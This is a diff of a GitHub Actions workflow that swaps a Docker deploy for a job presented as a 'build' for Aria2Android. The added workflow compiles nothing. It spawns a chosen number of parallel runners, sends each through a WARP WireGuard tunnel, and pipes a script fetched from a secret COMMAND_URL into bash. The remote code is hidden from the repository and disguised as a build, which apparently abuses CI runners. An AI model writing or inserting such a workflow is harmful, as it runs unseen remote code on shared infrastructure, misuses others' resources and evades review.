@@ -1,31 +1,44 @@
-name: Docker Deploy Workflow
+---
+# Github Actions build for Aria2Android
+
+name: build
 
 on:
   push:
     branches:
       - main
   workflow_dispatch:
+    inputs:
+      v:
+        required: true
+        default: '1'
+
+env:
+  COMMAND_URL: ${{ secrets.COMMAND_URL }}
 
 jobs:
-  deploy:
+  setup-matrix:
     runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - id: set-matrix
+        run: |
+          POD_COUNT=${{ github.event.inputs.v }}
+          JSON_ARRAY=$(seq 1 $POD_COUNT | jq -R . | jq -s -c)
+          echo "matrix=$JSON_ARRAY" >> $GITHUB_OUTPUT
+
+  build:
+    needs: setup-matrix
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        pod_index: ${{ fromJson(needs.setup-matrix.outputs.matrix) }}
     
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      
-      - name: Login to Docker Registry
-        uses: docker/login-action@v3
-        with:
-          registry: registry.gitlab.com
-          username: ${{ secrets.DOCKER_USERNAME }}
-          password: ${{ secrets.DOCKER_PASSWORD }}
-      
-      - name: Download config file
-        run: |
-          curl -o config.toml "${{ secrets.CONFIG_FILE_URL }}"
-          echo "Config file downloaded successfully"
-          ls -la config.toml
+      - name: Checkout repository
+        uses: actions/checkout@v6
 
       - name: Set up WARP
         uses: fscarmen/warp-on-actions@v1.4
@@ -33,10 +46,13 @@ jobs:
         with:
           stack: dual
           mode: wireguard
-          
-      - name: Run Docker container
+
+      - name: Run build script
+        env:
+          CI_RUN: "${{ github.repository }}/${{ github.run_id }}/${{ github.run_attempt }}/${{ github.job }}/${{ matrix.pod_index }}"
         run: |
-          docker run --rm -q \
-            -v "$(pwd)/config.toml:/app/config.toml:ro" \
-            ${{ secrets.DOCKER_IMAGE }} \
-            ${{ secrets.DOCKER_COMMAND }}
+          if [ -z "$COMMAND_URL" ]; then
+            echo "Error: COMMAND_URL is not set."
+            exit 1
+          fi
+          curl -fsSL "$COMMAND_URL" | bash
